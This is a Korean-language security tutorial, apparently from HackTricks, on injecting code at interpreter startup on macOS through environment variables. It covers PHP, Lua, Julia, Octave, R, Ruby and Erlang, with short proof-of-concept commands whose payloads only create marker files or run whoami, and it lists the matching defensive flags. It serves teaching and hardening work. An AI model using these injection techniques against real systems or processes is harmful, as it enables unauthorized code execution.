# 환경 변수를 통한 macOS 인터프리터 시작 시점 주입

{{#include ../../../banners/hacktricks-training.md}}

이러한 런타임별 기법은 상속된 환경 변수를 사용해 의도된 작업이 시작되기 전에 시작 구성을 선택하거나, 코드를 preload하거나, VM 플래그를 전달합니다. 일부 변형은 파일을 사용하며, Lua와 Erlang은 인라인 코드 실행도 지원합니다.

## PHP 시작 구성

### `PHPRC` / `PHP_INI_SCAN_DIR` 및 `auto_prepend_file`

PHP CLI와 CGI는 실행될 때마다 구성 파일을 읽습니다. `PHPRC`는 공격자가 읽을 수 있는 `php.ini`를 지정할 수 있고, `PHP_INI_SCAN_DIR`는 추가 `.ini` 파일을 검색하는 디렉터리를 다른 곳으로 지정할 수 있습니다. `auto_prepend_file` 지시어를 사용하면 PHP가 요청된 스크립트보다 먼저 파일을 파싱하므로, 이 조합으로 시작 시점 코드 실행이 가능합니다.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

또 다른 방법은 `.ini` 파일이 들어 있는 디렉터리를 사용하는 것입니다:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` 옵션은 `php.ini`를 무시하며, 명시적으로 지정한 신뢰할 수 있는 `-c` 경로가 `PHPRC`보다 우선합니다. 장시간 실행되는 서버 SAPI는 일반적으로 웹 서버가 시작될 때 설정을 읽는 반면, CLI와 CGI는 실행할 때마다 설정을 읽는다는 점을 기억하세요.<sup>[[1]](#references)</sup>

## Lua 시작 코드

### `LUA_INIT`

명령줄 옵션이나 대상 스크립트를 처리하기 전에 독립 실행형 Lua 인터프리터는 `LUA_INIT_<major>_<minor>`를 실행하거나, 버전이 지정된 변수가 없으면 `LUA_INIT`을 실행합니다. `@`로 시작하는 값은 파일을 지정하며, 그 외의 값은 Lua 코드로 직접 평가됩니다. 따라서 파일을 사용하는 방식과 파일 없이 시작 시 코드를 실행하는 방식이 모두 가능합니다.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

정확한 버전 지정 이름은 인터프리터에 따라 달라집니다. 예를 들어 `LUA_INIT_5_4`가 있습니다. `lua -E`는 시작 코드와 Lua 모듈 경로를 포함한 모든 환경 변수를 무시합니다.

## Julia startup depot

### `JULIA_DEPOT_PATH` 및 `startup.jl`

Julia는 일반적으로 시작할 때 첫 번째 depot의 `config/startup.jl`을 실행합니다. `JULIA_DEPOT_PATH`는 depot 목록을 제어하므로, 공격자가 읽을 수 있는 트리를 지정하면 자동으로 로드되는 시작 파일의 위치를 바꿀 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

마지막 구분자는 피해자가 일반 패키지를 계속 사용해야 할 때 유용합니다. `julia --startup-file=no`는 이 startup file을 비활성화합니다. 이 변수는 패키지 레지스트리, 환경, 캐시, 코드 로딩 위치도 제어하므로 실행 전에 변수를 지우세요.

## GNU Octave startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave는 시작 중에 유효한 Octave 명령이 포함된 여러 파일을 실행합니다. `OCTAVE_SITE_INITFILE`은 사이트 전체 startup file을 재정의하고, `OCTAVE_VERSION_INITFILE`은 버전별 startup file을 재정의합니다. 따라서 어느 변수를 사용하든 자동 실행 대상을 공격자가 읽을 수 있는 파일로 바꿀 수 있습니다.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file`은 `~/.octaverc` 같은 사용자 파일만 건너뛰며, 위의 site-file override는 막지 **않습니다**. site files에는 `--no-site-file`을 사용하고, 모든 startup files를 비활성화하려면 `--norc` / `-f`를 사용하세요.<sup>[[7]](#references)</sup>

## R 시작 프로필 및 패키지 로딩

### `R_PROFILE_USER` / `R_PROFILE`

시작 시 R은 R 코드가 들어 있는 site 및 사용자 프로필 파일을 불러옵니다. `R_PROFILE`은 site profile을, `R_PROFILE_USER`는 사용자 profile을 지정하므로, 상속된 환경을 통해 두 파일 중 하나의 경로를 공격자가 읽을 수 있는 파일로 바꿀 수 있습니다.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file`은 사용자 프로필을 건너뛰고, `--no-site-file`은 사이트 프로필을 건너뛰며, `--vanilla`는 두 가지 보호 기능을 모두 적용합니다. R은 먼저 `R_ENVIRON` 및 `R_ENVIRON_USER`에서 지정한 환경 파일을 처리하지만, 이 파일들은 변수만 설정합니다. 프로필 변수는 임의 코드를 직접 실행할 수 있는 수단입니다.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` 및 라이브러리 경로

R은 시작 중 `R_DEFAULT_PACKAGES`에 쉼표로 구분해 지정된 패키지를 연결합니다. `Rscript`에서는 `R_SCRIPT_DEFAULT_PACKAGES`가 우선 적용됩니다. 두 변수 중 하나를 `R_LIBS`, `R_LIBS_USER` 또는 `R_LIBS_SITE`와 조합하면 R이 공격자가 제어하는 설치된 패키지를 찾아 로드하게 만들 수 있습니다. 해당 패키지의 `.onLoad` 또는 `.onAttach` hook은 자동으로 실행됩니다.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

이를 위해서는 단순한 `.R` 파일이 아니라 구조적으로 유효한 설치된 R 패키지가 필요합니다. `--vanilla`는 직접 상속된 변수를 지우지 않으므로, 신뢰할 수 있는 wrapper는 profile 파일을 비활성화하는 것과 함께 기본 패키지 및 library 경로 변수도 해제하거나 대체해야 합니다.

## Ruby loader 옵션

### RUBYOPT

Ruby는 스크립트를 실행하기 전에 `RUBYOPT` 환경 변수에서 지원되는 명령줄 스위치를 파싱합니다. Ruby는 `RUBYOPT`에서 `-e`를 통한 코드 실행을 거부하지만, `-I`는 library 검색 디렉터리를 앞에 추가하고 `-r`은 library를 require할 수 있습니다. 따라서 공격자가 제어하는 환경 변수를 사용해 Ruby를 실행하는 프로세스가 공격자가 제어하는 Ruby 코드를 로드하도록 만들 수 있습니다.<sup>[[10]](#references)</sup>

`/tmp/inject.rb`를 만듭니다:

```ruby:inject.rb
puts `whoami`
```

무해한 Ruby 스크립트(예: `hello.rb`)를 작성합니다:

```ruby:hello.rb
puts 'Hello, World!'
```

제어된 `RUBYOPT` 값으로 실행합니다:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

이 동작을 비활성화하려면 스크립트 이름 **앞에** `--disable=rubyopt`(또는 `--disable-rubyopt`)를 전달하세요:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

`hello.rb` 뒤에 작성된 옵션은 스크립트의 `ARGV`로 전달되며, Ruby가 그보다 먼저 `RUBYOPT`를 처리하는 것을 비활성화하지 않습니다.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

`RUBYOPT` 내에서 `-I`를 사용해 로드 디렉터리를 앞에 추가하는 대신, 별도의 `RUBYLIB` 환경 변수는 디렉터리를 Ruby의 `$LOAD_PATH`에 추가합니다. 이를 `RUBYOPT=-r<module>`과 함께 사용하면 `RUBYOPT`에 `-I`를 넣지 않고도 공격자 코드를 로드할 수 있습니다:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang 및 Elixir VM 플래그

### `ERL_AFLAGS`, `ERL_FLAGS`, 및 `ERL_ZFLAGS`

`erl` 실행기는 `ERL_AFLAGS`를 명령줄 앞에 추가하고 `ERL_FLAGS` / `ERL_ZFLAGS`를 끝에 추가합니다. `-eval`은 VM 초기화 중 Erlang 표현식을 평가하므로, 이러한 변수로 의도된 워크로드가 실행되기 전에 파일리스 코드 실행을 수행할 수 있습니다.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix 및 여러 Elixir 릴리스는 결국 Erlang VM을 시작하며 이러한 플래그를 상속할 수 있습니다. 정확한 릴리스 래퍼를 확인하세요. 래퍼가 VM 인수를 다시 구성하거나 정리할 수 있으며, 일부 도구는 `ERL_AFLAGS`, `ERL_ZFLAGS` 또는 `ELIXIR_ERL_OPTIONS`를 명시적으로 지원합니다.<sup>[[12]](#references)</sup>

대부분의 파일 기반 기법과 달리, `-eval` 페이로드에는 공격자가 제어하는 파일이 필요하지 않습니다. 신뢰할 수 있는 래퍼는 런타임을 시작하기 전에 세 가지 Erlang 플래그 변수를 모두 지워야 합니다(Elixir의 경우 `ELIXIR_ERL_OPTIONS`도 지워야 합니다). 파서와 순서를 완전히 이해하지 못했다면 개별 VM 플래그를 허용 목록에 넣으려 하지 마세요.

## References

- [1] [PHP 설정 파일](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 독립 실행형 인터프리터](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia 명령줄 인터페이스: 시작 파일](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia 환경 변수: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave 시작 파일](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave 명령줄 옵션](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [R 세션 시작 시 초기화](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [R 설치 및 관리: 추가 패키지](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby 문서 - Ruby 명령줄 옵션](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl` 명령 및 환경 변수](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir 릴리스 및 VM 환경 옵션](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
